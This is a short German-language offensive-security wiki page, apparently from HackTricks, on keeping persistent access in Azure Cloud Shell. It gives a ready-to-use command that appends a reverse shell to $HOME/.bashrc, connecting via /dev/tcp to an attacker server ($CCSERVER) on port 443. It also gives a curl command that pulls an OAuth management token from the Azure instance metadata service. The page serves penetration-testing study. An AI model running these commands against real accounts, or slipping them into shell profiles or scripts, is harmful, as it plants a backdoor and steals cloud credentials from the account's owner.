# Az - Cloud Shell Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell Persistence

Azure Cloud Shell bietet Befehlszeilenzugriff zur Verwaltung von Azure-Ressourcen mit persistentem Speicher und automatischer Authentifizierung. Angreifer können dies ausnutzen, indem sie Hintertüren im persistenten Home-Verzeichnis platzieren:

* **Persistenter Speicher**: Das Home-Verzeichnis von Azure Cloud Shell ist auf einem Azure-Dateifreigabe gemountet und bleibt auch nach dem Ende der Sitzung intakt.
* **Startskripte**: Dateien wie .bashrc werden automatisch zu Beginn jeder Sitzung ausgeführt, was eine persistente Ausführung beim Start der Cloud Shell ermöglicht.

Beispiel-Hintertür in .bashrc:
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/$CCSERVER/443 0>&1 &)' >> $HOME/.bashrc
```
Diese Hintertür kann Befehle sogar 5 Minuten nach dem Abschluss der Cloud-Shell durch den Benutzer ausführen.

Zusätzlich wird der Azure-Metadatendienst nach Instanzdetails und Tokens abgefragt:
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s
```
{{#include ../../../banners/hacktricks-training.md}}
